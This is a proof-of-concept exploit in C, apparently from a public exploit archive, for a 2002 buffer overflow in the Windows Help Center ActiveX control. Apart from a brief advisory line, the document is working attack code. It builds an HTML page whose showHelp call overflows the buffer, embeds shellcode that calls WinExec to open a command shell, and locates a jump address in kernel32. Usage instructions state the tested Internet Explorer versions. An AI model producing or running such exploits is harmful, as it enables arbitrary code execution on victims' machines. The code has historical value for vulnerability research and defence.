source: http://www.securityfocus.com/bid/5874/info

The ActiveX control that provides much of the functionality for the Windows Help Center contains an unchecked buffer. Successful exploitation could result in execution of arbitrary code in the security context of the current user.

/*
By ipxodi@whitecell.org 10.07.2002

prove of concept code of Windows Help buffer overflow.
Bug discovered by 
For tech detail see "Thor Larholm security advisory TL#004".
To Use:
cl ex.c
Run as:
ex > ex.htm
start ex.htm    (be sure to set iexplore as your default htm viewer.)
You will get a cmd shell.

Tested on IE 5.5, IE5.5 SP2, IE 6.0.
other version untested.
*/

#include <windows.h>
#include <stdio.h>


char shellcode[] = "\x55\x8B\xEC\x33\xFF\x57\xC6\x45\xFC\x63\xC6\x45\xFD\x6D\xC6\x45\xFE\x64\x57\xC6\x45\xF8\x03" "\x80\x6D\xF8\x50" 
		"\x8D\x45\xFC\x50\x90\xB8" "EXEC" "\xFF\xD0\x33\xC0\x50\x90\xB8" "EXIT" "\xFF\xD0\xC3";

char shellcode_encode[] = "\x55\x8B\xEC\x33\xFF\x57\xC6\x45\xFC\x63\xC6\x45\xFD\x6D\xC6\x45\xFE\x64\x57\xC6\x45\xF8\x53" "\x80\x6D\xF8\x50" 
		"\x8D\x45\xFC\x50\x90\xB8" "EXEC" "\x2C\x78" "\xFF\xD0" "\x41\x33\xC0\x50\x90\xB8""EXIT" "\x2C\x78" "\xFF\xD0\xC3";

void EncodeFuncAddr(char * shellcode,DWORD addr,char * pattern)
{
	unsigned char * p ;
	p = strstr(shellcode,pattern);
	if(p)	{
		if( *(p+4) == '\xFF' )	
			memcpy(p,&addr,4);
		else {
			if((addr & 0xFF) > 0x80)	{
				memcpy(p,&addr,4);	
				*(p+4) = 0x90;
				*(p+5) = 0x90;
			}else	{
				addr += 0x78;
				memcpy(p,&addr,4);
			}
		}
	}
}

int ModifyFuncAddr(char * shellcode)
{
	char * temp="0123456789ABCDEF";
	HMODULE hdl;
	unsigned char * p ;
	DWORD pAddr_WinExec ,pAddr_Exit ;

	hdl = LoadLibrary("kernel32.dll");
	pAddr_WinExec = GetProcAddress(hdl,"WinExec");
	pAddr_Exit = GetProcAddress(hdl,"ExitProcess"); 
	fprintf(stderr,"Find WinExec at Address %x, ExitProcess at Address %x\n",pAddr_WinExec,pAddr_Exit);
	EncodeFuncAddr(shellcode,pAddr_WinExec,"EXEC");
	EncodeFuncAddr(shellcode,pAddr_Exit,"EXIT");
}


void Validate(char * shellcode)
{
	unsigned char *p, *foo = "\\\/:*?\"<>|";
	for(;*foo;foo++)	{
		p = strchr(shellcode,*foo);
		if(p)	{
			fprintf(stderr,"ERROR:ShellCode Contains Invalid Char For File name: %s\n",p);
		}
	}
}

#define Valid(c)	(c>0x30)
int FindCode(char * code)
{
	DWORD addr;
	unsigned char * p = (unsigned char * )LoadLibrary("kernel32.dll");

	for(;p < 0x77f00000;p++)
		if(memcmp(p,code,2)==0)	{
			fprintf(stderr,"Find Code at Address %x\n",p);
			addr = (DWORD) p;
			if( (addr &0xFF )>0x30 && ((addr>>8)&0xFF)>0x30&& ((addr>>16)&0xFF)>0x30 && ((addr>>24)&0xFF)>0x30 )
				return p;
		}
	return 0;
}
int main(int argc, char ** argv)
{
	char * prefix = "<script type=\"text/javascript\">showHelp(\"";
	char *postfix = "\");</script>";
	char buff[1024];
	int mode = 2;
	char * pCode = buff, *shell;
	DWORD addr;
	int offset = 784;
	
	if(argc > 3 )	{
		printf("Usage:   %s [mode] [offset]",argv[0]);
		printf("Normal:  %s 1 784",argv[0]);
		printf("Advanc:  %s 2 784",argv[0]);
		exit(0);
	}else if(argc == 3 )	{
		offset = atoi(argv[2]);
		mode = atoi(argv[1]);
	};
	fprintf(stderr,"Mode %d, Using Offset %d\n",mode,offset);
	memset(buff,0x41,1023);
	
	memcpy(pCode, "A:\\\xC0",4);	//cmp al,al as a nop.
	
	switch(mode)	{
		case 1: shell = shellcode; break;
		case 2: shell = shellcode_encode;break;
		case 3: {
				sprintf(buff +offset, "abcd");
				printf("%s%s%s",prefix,buff,postfix);
				return ;
				}
	}
	ModifyFuncAddr(shell);
	Validate(shell);
	memcpy(pCode+0x10,shell,strlen(shell));
	pCode = buff + offset;
	addr = FindCode("\xFF\xE7");	// jmp edi
	*(int*)pCode = addr ? addr : 0x77e79d02;
	*(pCode+4)=0;
	printf("%s%s%s",prefix,buff,postfix);
}
	